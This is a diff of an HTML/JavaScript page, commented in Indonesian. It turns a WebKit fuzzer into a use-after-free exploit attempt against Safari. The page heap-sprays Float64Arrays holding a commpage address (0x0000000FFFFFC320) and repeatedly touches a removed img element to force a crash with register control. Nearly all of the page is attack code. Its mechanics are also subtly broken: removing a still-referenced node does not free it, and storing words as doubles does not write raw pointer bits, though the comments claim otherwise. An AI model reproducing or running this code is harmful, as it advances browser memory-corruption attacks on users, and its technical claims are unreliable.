@@ -1,126 +1,123 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WebKit Commpage Target Fuzzer</title>
-    </head>
+    <title>UAF Commpage Register Control</title>
+    <style>
+        /* Gaya CSS */
+    </style>
+</head>
 <body>
 
-    <h1>Advanced WebKit Fuzzer (Targeting Commpage Flag Address)</h1>
-    <p>Target Alamat Kontrol (Harus di Register saat Crash): <span class="control-value">0x0000000FFFFFC320</span></p>
-    <p>Status: <span id="status">Memuat...</span></p>
-    <p>Iterasi: <span id="counter">0</span> | Objek Global: <span id="obj-count">0</span></p>
-    <div class="log" id="log">Log Aktivitas Detail:</div>
+    <h1>UAF Register Control Experiment (Targeting Commpage Address)</h1>
+    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
+    <p id="status">INIT: Siap memulai UAF...</p>
+    <div id="log"></div>
 
     <script>
-        // --- KONFIGURASI KONTROL (MENGGUNAKAN ALAMAT COMM PAGE) ---
-        // Kita menggunakan alamat _COMM_PAGE_ASB_TARGET_VALUE sebagai payload kita.
+        // --- KONSTANTA COMM PAGE (DARI PANDUAN APPLE) ---
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
         const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
-        
-        // Nilai payload adalah alamat commpage target value
         const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; // 0x0000000FFFFFC320
         
-        // Pisahkan menjadi bagian 32-bit (untuk injeksi array)
+        // Pemisahan 64-bit address menjadi dua 32-bit words (untuk injeksi ke memori)
         const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
-        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n); // Untuk kasus userspace, ini kemungkinan besar 0
-        
-        // ... (Konstanta, fungsi logActivity, dll. sama seperti kode sebelumnya) ...
-        const MAX_GLOBAL_OBJS = 200; 
-        let currentIteration = 0;
-        let running = false;
-        let globalObjects = []; 
-        
-        // Fungsi Heap Spraying yang dimodifikasi
-        function sprayHeap() {
-            const SPRAY_COUNT = 50;
-            const SPRAY_SIZE = 10; 
-            
-            for (let i = 0; i < SPRAY_COUNT; i++) {
-                let fillerArray = new Float64Array(SPRAY_SIZE);
-                
-                // Masukkan ALAMAT TARGET COMM PAGE ke array
-                // Kita berharap alokasi ini akan menimpa pointer di memori
-                fillerArray[0] = HIGH_WORD; // Bagian atas alamat (0 di userspace)
-                fillerArray[1] = LOW_WORD;  // Bagian bawah alamat (0xFFFFC320)
-                fillerArray[2] = 1337.0 + i; 
+        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n); // Untuk userspace, ini 0.
 
-                globalObjects.push(fillerArray); 
-            }
-            logActivity(`Heap Spray: ${SPRAY_COUNT} array diisi dengan alamat target Commpage.`);
+        let victimPointer = null; // Pointer yang akan kita buat menjadi "dangling"
+        let sprayHolders = [];    // Array untuk mencegah Payload di-GC
+        let isCrashed = false;
+
+        function log(message) {
+            document.getElementById('log').innerHTML += '<div>' + message + '</div>';
         }
-        
-        // ... (Fungsi createTypeConfusion() sama) ...
 
-        // ... (Fungsi fuzzIteration() sama) ...
-        function fuzzIteration() {
-            if (!running) {
-                document.getElementById('status').textContent = 'STOPPED';
-                return;
+        // 1. ALLOCATION (Fase Membuat Objek Target)
+        function phase1_Allocate() {
+            // Membuat objek yang kompleks di heap yang mungkin memiliki pointer C++
+            victimPointer = document.createElement('img');
+            victimPointer.id = 'victim';
+            document.body.appendChild(victimPointer);
+            log("Phase 1: Objek Target (img) dibuat.");
+        }
+
+        // 2. FREE (Fase Menciptakan Lubang Memori)
+        function phase2_Free() {
+            // Hapus objek dari DOM (ini memicu C++ destructor dan free memori)
+            if (victimPointer && victimPointer.parentNode) {
+                victimPointer.parentNode.removeChild(victimPointer);
+                // NAMUN, kita TIDAK menghapus 'victimPointer' di JavaScript.
+                // victimPointer sekarang adalah 'dangling pointer' (UAF).
+                log("Phase 2: Objek Target dihapus dari DOM (FREE). Lubang memori dibuat.");
             }
+        }
 
-            currentIteration++;
-            document.getElementById('counter').textContent = currentIteration;
-            document.getElementById('obj-count').textContent = globalObjects.length;
-            
-            try {
-                // 1. OBJECT ALLOCATION & SETUP (Sama)
-                const newObj = {
-                    a: new Array(5).fill(currentIteration),
-                    b: document.createElement('canvas'),
-                    c: currentIteration 
-                };
-                document.body.appendChild(newObj.b);
-                globalObjects.push(newObj);
+        // 3. RE-ALLOCATE (Fase Mengisi Lubang dengan Payload)
+        function phase3_SprayPayload() {
+            const SPRAY_COUNT = 500; // Jumlah array yang banyak untuk memastikan kita menimpa lubang
+            const SPRAY_SIZE = 12;   // Ukuran yang disesuaikan untuk menimpa objek DOM
 
-                // 2. TRIGGERING DELETION & UAF (Sama)
-                if (globalObjects.length > MAX_GLOBAL_OBJS) {
-                    const freeRangeStart = 0;
-                    const freeRangeEnd = 10; 
-                    
-                    for (let i = freeRangeStart; i < freeRangeEnd; i++) {
-                        const freedObj = globalObjects[i];
-                        if (freedObj && freedObj.b && freedObj.b.parentNode) {
-                            freedObj.b.parentNode.removeChild(freedObj.b);
-                        }
-                    }
-                    globalObjects.splice(freeRangeStart, freeRangeEnd);
-
-                    logActivity(`UAF Pemicu: ${freeRangeEnd} objek dihapus dari DOM.`);
-                    
-                    // SEGERA setelah free, lakukan heap spraying
-                    sprayHeap();
-                }
-
-                // 3. EXPLOIT ATTEMPT: UAF Dereference
-                if (globalObjects.length > 50 && (currentIteration % 50 === 0)) {
-                    const uafTarget = globalObjects[Math.floor(Math.random() * 50) + 10]; 
-                    
-                    if (uafTarget && uafTarget.a) {
-                        // Coba Type Confusion pada array
-                        createTypeConfusion(uafTarget); 
-                        
-                        if (uafTarget.b) {
-                           // uafTarget.b sekarang mungkin ditimpa oleh ALAMAT COMM PAGE
-                           // Ketika Safari mencoba membaca properti objek ini, ia mencoba membaca dari 0x0000000FFFFFC320
-                           // YANG BERISI NILAI RANDOM FLAG (_COMM_PAGE_ASB_TARGET_VALUE)
-                           
-                           // Ini akan menyebabkan crash saat mencoba mengakses memori tersebut (membaca nilai flag)
-                           const crashValue = uafTarget.b.offsetWidth; 
-                           logActivity("UAF/Dereference: Mencoba membaca properti objek yang mungkin rusak. Nilai: " + crashValue);
-                        }
-                    }
-                }
+            for (let i = 0; i < SPRAY_COUNT; i++) {
+                // Gunakan DataView/Float64Array karena ukurannya stabil dan dapat menyimpan 64-bit values.
+                let payloadArray = new Float64Array(SPRAY_SIZE);
                 
-                // ... (Batasan objek) ...
+                // Masukkan ALAMAT COMM PAGE ke array
+                // Kita berharap data ini sekarang menggantikan struktur C++ dari objek 'img' yang sudah di-free.
+                payloadArray[0] = HIGH_WORD; // Bagian atas 
+                payloadArray[1] = LOW_WORD;  // Bagian bawah (Target Address: 0xFFFFC320)
+                payloadArray[2] = 7331.0;    // Nilai acak pengisi
+
+                // Simpan referensi payload
+                sprayHolders.push(payloadArray); 
+            }
+            log(`Phase 3: Heap Spraying dengan ${SPRAY_COUNT} Payload (0x...C320).`);
+        }
+
+        // 4. TRIGGER (Fase Memanfaatkan UAF)
+        function phase4_TriggerUAF() {
+            if (isCrashed) return;
+
+            // Sekarang kita mencoba menggunakan 'victimPointer' yang seharusnya sudah mati,
+            // tetapi kini menunjuk ke Payload yang berisi alamat Commpage.
+            try {
+                // Akses properti yang akan memicu dereferensi pointer C++ internal
+                // Pointer internal ini sekarang berisi TARGET_CONTROL_ADDRESS (0x0000000FFFFFC320)
+                // CPU akan mencoba mengakses memori di 0x0000000FFFFFC320, yang berisi _COMM_PAGE_ASB_TARGET_VALUE
+                log("Phase 4: Memicu UAF Dereference (Mencoba mengakses memori Commpage)...");
+                
+                // Mengakses properti 'align' pada objek img sering memicu dereferensi pointer
+                victimPointer.align = "crash"; 
 
             } catch (e) {
-                // ... (Penanganan kesalahan) ...
+                // Menangani error JS (tetapi crash yang kita cari adalah crash OS/Segfault)
+                log("Error: " + e.message + " - Crash OS diharapkan, BUKAN error JS.");
             }
-
-            setTimeout(fuzzIteration, 1); 
+            
+            // Jaga agar referensi tetap ada (jangan segera hapus sprayHolders)
         }
+        
+        // --- URUTAN EKSEKUSI ---
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('status').textContent = 'Memulai rangkaian UAF...';
+            
+            // 1. Alokasi
+            setTimeout(phase1_Allocate, 100);
+            
+            // 2. Free
+            setTimeout(phase2_Free, 200);
+            
+            // 3. Re-allocate / Spray Payload
+            setTimeout(phase3_SprayPayload, 300);
+            
+            // 4. Trigger (Lakukan berulang kali untuk stabilitas)
+            // Timeout yang singkat sangat penting untuk timing yang pas (race condition)
+            for (let i = 0; i < 50; i++) {
+                 setTimeout(phase4_TriggerUAF, 400 + (i * 10));
+            }
+            
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tunggu Crash.';
+        });
 
-        // ... (Initialisasi sama) ...
     </script>
 </body>
 </html>
